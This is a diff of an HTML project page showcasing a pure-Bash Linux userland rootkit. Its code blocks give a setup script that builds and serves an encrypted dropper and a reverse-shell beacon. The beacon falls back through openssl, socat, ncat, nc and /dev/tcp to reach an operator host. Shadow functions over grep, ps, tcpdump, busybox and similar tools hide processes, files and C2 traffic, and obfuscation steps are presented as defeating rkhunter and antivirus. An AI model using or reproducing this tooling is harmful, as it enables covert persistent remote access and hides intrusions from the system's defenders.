@@ -387,12 +387,12 @@
 
   <!-- HERO -->
   <div class="hero">
-    <div class="hero-eyebrow">// offensive security · bash · linux internals</div>
+    <div class="hero-eyebrow">// living off the land · bash · linux internals</div>
     <h1 class="hero-title">bash&#8209;<span class="accent-word">rootkit</span></h1>
     <p class="hero-desc">
-      A pure-Bash userland rootkit built from Linux tips and tricks — no compiled binaries,
-      no kernel modules. Persists as a reverse-shell beacon, hides its own PID, and
-      shadows common system commands to blind the defender.<span class="blink">_</span>
+      Living off the land: a pure-Bash userland rootkit — no compiled binaries,
+      no kernel modules. Persists as an encrypted reverse-shell beacon, hides its own PID, and
+      shadows common system commands to blind the defender using only tools already on the box.<span class="blink">_</span>
     </p>
     <div class="badges">
       <span class="badge badge-green">Bash</span>
@@ -410,15 +410,16 @@
     <h2>What is this?</h2>
     <p>
       A fully self-contained userland rootkit written in pure Bash — no compiled code,
-      no kernel exploits. Everything runs in the shell itself, which is exactly what makes
-      it interesting: the OS's own tools are turned against the operator.
+      no kernel exploits. Everything runs using tools already present on a stock Linux system.
+      Pure living off the land.
     </p>
     <p>
-      The project has three layers: a <strong style="color:#fff">beacon script</strong>
-      that maintains a persistent reverse shell, a set of <strong style="color:#fff">shadowed
+      Three layers: a <strong style="color:#fff">beacon</strong> that maintains a persistent
+      reverse shell with a full connection fallback chain, <strong style="color:#fff">shadowed
       shell functions</strong> that masquerade as real Linux commands, and
-      <strong style="color:#fff">THC's Bincrypter</strong> for obfuscation and
-      in-memory-only execution.
+      <strong style="color:#fff">THC Bincrypter</strong> for in-memory-only execution.
+      Everything is assembled by a single <code>./setup.sh</code> into a ready-to-serve
+      <code>dropper.sh</code>.
     </p>
     <div class="card-grid">
       <div class="card">
@@ -447,24 +448,58 @@
   <!-- PIPELINE -->
   <section class="reveal">
     <div class="section-label">// 02 — build pipeline</div>
-    <h2>How it's assembled</h2>
-    <p>Three stages turn readable Bash into a stealthy, opaque blob that never hits disk in cleartext.</p>
+    <h2>./setup.sh</h2>
+    <p>Everything is assembled by a single script. Prompts for IP and PORT, patches all
+    templates, obfuscates the functions, encrypts the beacon, and outputs a single
+    ready-to-serve <code>dropper.sh</code>.</p>
     <div class="pipeline">
       <div class="pipeline-step">
         <div class="step-num">STEP 01</div>
-        <h4>Write the Functions</h4>
-        <p>Craft shadow functions in <code>final_functions</code> that wrap every detection tool.</p>
+        <h4>Patch Templates</h4>
+        <p>Copies <code>*.blank</code> templates and sed-patches IP, PORT, and persistence
+        path into <code>real_beacon</code> and <code>final_functions</code>.</p>
       </div>
       <div class="pipeline-step">
         <div class="step-num">STEP 02</div>
         <h4>Obfuscate Functions</h4>
-        <p><code>function_obfuscater.sh</code> hex-encodes the shadow functions and splits them into 32-char chunks that look like MD5 hash variables. Reassembled and eval'd at load time — never readable on disk.</p>
+        <p><code>function_obfuscater.sh</code> hex-encodes the shadow functions into
+        shuffled MD5-length variable chunks, injected at the <code>EFUNCTIONS</code>
+        marker in <code>dropper.sh</code>.</p>
       </div>
       <div class="pipeline-step">
         <div class="step-num">STEP 03</div>
-        <h4>Bincrypter</h4>
-        <p>THC's Bincrypter encrypts the final beacon — unreadable at rest, runs in memory at runtime.</p>
+        <h4>Encrypt Beacon</h4>
+        <p>THC Bincrypter encrypts <code>real_beacon</code>, base64 embeds it at the
+        <code>MFUNCTIONS</code> marker. In-memory execution only — no cleartext on disk.</p>
       </div>
+    </div>
+    <div class="code-wrap" style="margin-top:24px">
+      <div class="code-header">
+        <div class="code-dot dot-r"></div><div class="code-dot dot-y"></div><div class="code-dot dot-g"></div>
+        <span class="code-filename">setup.sh — full pipeline</span>
+      </div>
+      <pre><span class="cmt"># Patch templates</span>
+<span class="fn">sed</span> <span class="op">-i</span> <span class="str">"s/IP/$IP/g"</span>     real_beacon
+<span class="fn">sed</span> <span class="op">-i</span> <span class="str">"s/PORT/$PORT/g"</span> real_beacon
+<span class="fn">sed</span> <span class="op">-i</span> <span class="str">"s/PORT/$PORT/g"</span> final_functions
+<span class="fn">sed</span> <span class="op">-i</span> <span class="str">"s/PATH/$Path/g"</span>  final_functions  <span class="cmt"># default: /usr/lib64/libda-5.3.so</span>
+
+<span class="cmt"># Obfuscate functions → inject at EFUNCTIONS marker</span>
+./function_obfuscater.sh <span class="str">"userIDs"</span> 18 <span class="str">"final_functions"</span> <span class="str">"y"</span> <span class="str">"m"</span> <span class="str">"2"</span> > /tmp/obf_out.txt
+<span class="fn">sed</span> <span class="op">-i</span> <span class="str">"/EFUNCTIONS/r /tmp/obf_out.txt"</span> dropper.sh
+<span class="fn">sed</span> <span class="op">-i</span> <span class="str">"/EFUNCTIONS/d"</span> dropper.sh
+
+<span class="cmt"># Encrypt beacon → base64 → inject at MFUNCTIONS marker</span>
+<span class="fn">cp</span> real_beacon bad && ./bincrypter.sh bad
+<span class="fn">base64</span> bad > /tmp/obf_out.txt
+<span class="fn">awk</span> <span class="str">'
+    FILENAME == "/tmp/obf_out.txt" { obf = obf $0 "\n"; next }
+    { gsub(/MFUNCTIONS/, obf); print }
+'</span> /tmp/obf_out.txt dropper.sh > /tmp/result.sh && <span class="fn">mv</span> /tmp/result.sh dropper.sh
+
+<span class="cmt"># Serve it</span>
+<span class="fn">python</span> <span class="op">-m</span> http.server 8080
+<span class="fn">curl</span> &lt;ip&gt;:8080/dropper.sh <span class="op">-O</span></pre>
     </div>
   </section>
 
@@ -473,41 +508,37 @@
     <div class="section-label">// 03 — beacon script</div>
     <h2>real_beacon</h2>
     <p>
-      The core loop. Hides itself using <code>/proc</code> bind-mounts, remounts <code>/proc</code>
-      with <code>hidepid=2</code>, names its subshell after a kernel thread, then opens a raw
-      TCP socket to the C2 operator.
+      The core loop. Hides every spawned PID via <code>mtab()</code>, uses a randomized
+      named pipe in <code>/dev/shm</code>, and tries each available connection tool in order —
+      working on almost any stock Linux system without extra packages.
     </p>
     <div class="code-wrap">
       <div class="code-header">
         <div class="code-dot dot-r"></div><div class="code-dot dot-y"></div><div class="code-dot dot-g"></div>
-        <span class="code-filename">real_beacon — core loop</span>
+        <span class="code-filename">real_beacon — connection fallback chain</span>
       </div>
-      <pre><span class="cmt"># Remount /proc so other users can't enumerate PIDs</span>
-<span class="fn">mount</span> <span class="op">-o</span> remount,hidepid=2 /proc 2>/dev/null
-<span class="fn">mtab</span> $$   <span class="cmt"># bind-mount empty dir over our own /proc/PID</span>
+      <pre><span class="var">PIPE</span>=<span class="str">"/dev/shm/.cache_$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)"</span>
+<span class="fn">mkfifo</span> <span class="str">"$PIPE"</span>
 
-<span class="kw">while</span> <span class="kw">true</span>; do
-  (
-    <span class="fn">mtab</span> $$ 2>/dev/null
+<span class="kw">if</span> command <span class="op">-v</span> openssl &>/dev/null; <span class="kw">then</span>
+    ( /bin/bash &lt; $PIPE 2>&1 | openssl s_client <span class="op">-quiet</span> <span class="op">-connect</span> <span class="var">$IP</span>:<span class="var">$PORT</span> > $PIPE ) &
+<span class="kw">elif</span> command <span class="op">-v</span> socat &>/dev/null; <span class="kw">then</span>
+    ( socat OPENSSL:<span class="var">$IP</span>:<span class="var">$PORT</span>,verify=0 EXEC:/bin/bash ) &
+<span class="kw">elif</span> command <span class="op">-v</span> ncat &>/dev/null; <span class="kw">then</span>
+    ( /bin/bash &lt; $PIPE 2>&1 | ncat <span class="op">--ssl</span> <span class="var">$IP</span> <span class="var">$PORT</span> > $PIPE ) &
+<span class="kw">elif</span> command <span class="op">-v</span> nc &>/dev/null; <span class="kw">then</span>
+    ( cat $PIPE | /bin/bash 2>&1 | nc <span class="var">$IP</span> <span class="var">$PORT</span> > $PIPE ) &
+<span class="kw">else</span>
+    ( /bin/bash >&amp; /dev/tcp/<span class="var">$IP</span>/<span class="var">$PORT</span> 0>&1 ) &  <span class="cmt"># pure bash fallback</span>
+<span class="kw">fi</span>
 
-    <span class="cmt"># Spoof process name as a kernel worker thread</span>
-    <span class="var">FAKE_NAME</span>=<span class="str">"[kworker/u$(shuf -i 0-5 -n 1):$(shuf -i 0-5 -n 1)]"</span>
-
-    <span class="kw">if</span> exec 5<>/dev/tcp/<span class="var">$IP</span>/<span class="var">$PORT</span> 2>/dev/null; <span class="kw">then</span>
-      <span class="fn">echo</span> <span class="str">"\nHIDDEN SHELL: $(hostname) ($(whoami))\n"</span> >&5
-      <span class="fn">echo</span> <span class="str">'while read -r line; do $line; done'</span> \
-        | exec <span class="op">-a</span> <span class="str">"$FAKE_NAME"</span> sh <&5 >&5 2>&5
-    <span class="kw">fi</span>
-  ) & disown
-
-  <span class="fn">ssleep</span>   <span class="cmt"># sleep with its own hidden PID</span>
-<span class="kw">done</span> &>/dev/null</pre>
+<span class="var">pid</span>=$!
+<span class="var">pids</span>=<span class="str">"$pid $(pgrep -P $pid)"</span>
+<span class="kw">for</span> i <span class="kw">in</span> $pids; <span class="kw">do</span> <span class="fn">mtab</span> $i; <span class="kw">done</span></pre>
     </div>
-
-    <p style="margin-top:4px">
-      Cleanup is handled via a <code>trap</code> on EXIT / SIGINT / SIGTERM — unmounting all
-      <code>/dev/shm</code> bind-mounts and killing background jobs so the operator can
-      leave a clean slate on demand.
+    <p style="margin-top:8px">
+      Cleanup via <code>trap</code> on EXIT / SIGINT / SIGTERM — unmounts all
+      <code>/dev/shm</code> bind-mounts and kills background jobs on demand.
     </p>
   </section>
 
@@ -518,8 +549,9 @@
     <p>
       Every common detection tool is overridden with a Bash function that calls the real binary
       but pipes output through <code>grep -Ev "$_HG_P"</code> — stripping any line matching
-      the rootkit's fingerprint pattern. Tab-completion is preserved by checking
-      <code>$COMP_LINE</code> and bypassing the filter during completions.
+      the rootkit's fingerprint pattern. Tab-completion is preserved via <code>$COMP_LINE</code>
+      checks. The persistence path and C2 port are patched into <code>_HG_P</code> by
+      <code>setup.sh</code> at build time.
     </p>
 
     <div class="table-wrap">
@@ -528,16 +560,18 @@
           <tr><th>Command</th><th>Technique</th><th>What it hides</th></tr>
         </thead>
         <tbody>
+          <tr><td>busybox</td><td>Subcmd router</td><td>Routes all subcommands through hooked functions — defeats busybox-as-clean-binary bypass</td></tr>
           <tr><td>ls</td><td>Bash fn + <code>-I</code> flags</td><td>Hidden files &amp; empty /proc entries for masked PIDs</td></tr>
-          <tr><td>ps / pgrep / top / htop</td><td>Pattern-filtered output</td><td>Rootkit proc names, IP, port</td></tr>
+          <tr><td>ps / pgrep / top / htop</td><td>Mounted over by <code>mtab()</code></td><td>Rootkit processes</td></tr>
           <tr><td>grep / head / tail / cat</td><td>Pipe ∣ grep -Ev $_HG_P</td><td>Any line containing rootkit indicators</td></tr>
           <tr><td>mount / findmnt</td><td>Output filter</td><td>/proc and /dev/shm bind-mounts</td></tr>
-          <tr><td>tcpdump</td><td>Auto-inject BPF filter</td><td>C2 IP and port from all captures</td></tr>
+          <tr><td>tcpdump</td><td>Auto-inject BPF filter</td><td>C2 port from all captures</td></tr>
+          <tr><td>ss / netstat</td><td>Pattern-filtered output</td><td>C2 port connection</td></tr>
           <tr><td>lsof / strace</td><td>Pattern-filtered output</td><td>Open FDs and syscalls related to the beacon</td></tr>
           <tr><td>set / declare / typeset</td><td>AWK block-skip parser</td><td>Shadow function definitions from variable dumps</td></tr>
           <tr><td>env / printenv / export</td><td>AWK + grep filter</td><td>_HG_P env var &amp; BASH_FUNC_* exports</td></tr>
           <tr><td>type / which</td><td>Hardcoded case statements</td><td>Returns fake binary paths for shadowed commands</td></tr>
-          <tr><td>unset / builtin</td><td>Re-source hook</td><td>Re-injects functions if someone tries to unset them</td></tr>
+          <tr><td>unset / builtin</td><td>Guard wrapper</td><td>Silently fails if called against any hooked function</td></tr>
         </tbody>
       </table>
     </div>
@@ -545,33 +579,29 @@
     <div class="code-wrap" style="margin-top:24px">
       <div class="code-header">
         <div class="code-dot dot-r"></div><div class="code-dot dot-y"></div><div class="code-dot dot-g"></div>
-        <span class="code-filename">final_functions — shadow examples</span>
+        <span class="code-filename">final_functions — examples</span>
       </div>
-      <pre><span class="cmt"># Master filter pattern — every rootkit indicator in one variable</span>
-<span class="kw">command export</span> <span class="var">_HG_P</span>=<span class="str">"grep|ps|mount|4316|127.0.0.1|/proc/|hidepid|bash_|..."</span>
+      <pre><span class="cmt"># Port and persistence path patched in by setup.sh</span>
+<span class="kw">command export</span> <span class="var">_HG_P</span>=<span class="str">"grep|ps|mount|PORT|/proc/|hidepid|PATH|..."</span>
 
 <span class="fn">grep</span>() {
-  [[ -n <span class="str">"$COMP_LINE"</span> ]] && { /usr/bin/grep <span class="str">"$@"</span>; <span class="kw">return</span>; }
-  /usr/bin/grep <span class="str">"$@"</span> | /usr/bin/grep <span class="op">-Ev</span> <span class="str">"$_HG_P"</span>
+  [[ -n <span class="str">"$COMP_LINE"</span> ]] && { command <span class="fn">$(which grep)</span> <span class="str">"$@"</span>; <span class="kw">return</span>; }
+  command <span class="fn">$(which grep)</span> <span class="str">"$@"</span> | _filter_output
 }
 
-<span class="cmt"># tcpdump auto-injects a BPF expression to hide C2 traffic</span>
-<span class="fn">tcpdump</span>() {
-  <span class="kw">local</span> <span class="var">f</span>=<span class="str">"not port 4316 and not host 127.0.0.1"</span>
-  [[ $# -eq 0 ]] \
-    && /usr/sbin/tcpdump -i any $f 2>/dev/null \
-    || /usr/sbin/tcpdump <span class="str">"$@"</span> and $f 2>/dev/null
-}
+<span class="cmt"># Absolute path calls also intercepted — registered at load time</span>
+<span class="kw">for</span> cmd <span class="kw">in</span> grep ls mount ss netstat tcpdump ...; <span class="kw">do</span>
+  path=$(which $cmd)
+  <span class="fn">eval</span> <span class="str">"function $path { $cmd \"\$@\"; }"</span>
+<span class="kw">done</span>
 
-<span class="cmt"># type / which return fake paths so forensics look clean</span>
-<span class="fn">type</span>() {
-  <span class="kw">for</span> a <span class="kw">in</span> <span class="str">"$@"</span>; <span class="kw">do</span>
-    <span class="kw">case</span> <span class="str">"$a"</span> <span class="kw">in</span>
-      grep|ps|mount|...) /usr/bin/echo <span class="str">"$a is /usr/bin/$a"</span> ;;
-      type|set|alias|...) /usr/bin/echo <span class="str">"$a is a shell builtin"</span> ;;
-      *) command builtin type <span class="str">"$a"</span> 2>/dev/null ;;
-    <span class="kw">esac</span>
+<span class="cmt"># busybox — routes subcommands through hooked functions</span>
+<span class="fn">busybox</span>() {
+  <span class="kw">local</span> subcmd=<span class="str">"$1"</span>; shift
+  <span class="kw">for</span> w <span class="kw">in</span> grep ls mount ss netstat ...; <span class="kw">do</span>
+    [[ <span class="str">"$subcmd"</span> == <span class="str">"$w"</span> ]] && { <span class="str">"$subcmd"</span> <span class="str">"$@"</span>; <span class="kw">return</span>; }
   <span class="kw">done</span>
+  command busybox <span class="str">"$subcmd"</span> <span class="str">"$@"</span>
 }</pre>
     </div>
   </section>
@@ -579,24 +609,29 @@
   <!-- OBFUSCATION -->
   <section class="reveal">
     <div class="section-label">// 05 — obfuscation</div>
-    <h2>THC Bincrypter</h2>
+    <h2>THC Bincrypter + function_obfuscater.sh</h2>
     <p>
-      After the beacon is finalized, it's passed through
-      <a href="https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet" target="_blank">THC's Bincrypter</a>.
-      The resulting file appears as binary noise — <code>strings</code>, <code>cat</code>, and <code>file</code>
-      reveal nothing useful. At runtime the script self-decrypts into a <code>tmpfs</code>-backed
-      memory region and executes there, leaving no cleartext artifact on disk.
+      Two tools handle obfuscation. <code>function_obfuscater.sh</code> converts the shadow
+      functions into shuffled MD5-length hex variable chunks — a static scan sees hash-like
+      noise and a generic loader one-liner. The beacon is packed with
+      <a href="https://github.com/hackerschoice/bincrypter" target="_blank">THC Bincrypter</a>:
+      encrypted, compressed, and base64-embedded into <code>dropper.sh</code>.
     </p>
     <div class="card-grid">
       <div class="card">
         <div class="card-icon">🧩</div>
-        <h3>Unreadable at rest</h3>
-        <p>The script file is opaque binary. Static analysis tools and casual inspection find nothing of value.</p>
+        <h3>Functions — MD5 camouflage</h3>
+        <p>Hex-encoded and split into 32-char chunks resembling MD5 update variables. Shuffled. Reassembled at load time via <code>xxd -r -p</code>.</p>
       </div>
       <div class="card">
         <div class="card-icon">🧠</div>
-        <h3>In-memory execution</h3>
-        <p>The cleartext payload lives only in RAM. No forensic image of the disk will recover it.</p>
+        <h3>Beacon — in-memory only</h3>
+        <p>Bincrypter wraps the beacon in a self-decrypting stub. Cleartext payload lives only in RAM — no forensic disk image recovers it.</p>
+      </div>
+      <div class="card">
+        <div class="card-icon">🔀</div>
+        <h3>Morphing signatures</h3>
+        <p>Bincrypter produces a different signature on every run, defeating static AV detection.</p>
       </div>
     </div>
   </section>
@@ -615,12 +650,12 @@
       <div class="card">
         <div class="card-icon">🖥️</div>
         <h3>CentOS 7</h3>
-        <p>Tested on a CentOS 7 system. Same stealth behaviour confirmed across all layers.</p>
+        <p>All three layers confirmed working on a CentOS 7 system.</p>
       </div>
       <div class="card">
         <div class="card-icon">✅</div>
         <h3>rkhunter 1.4.6</h3>
-        <p>rkhunter 1.4.6 did not detect the rootkit on either system.</p>
+        <p>Not detected on either system.</p>
       </div>
     </div>
   </section>
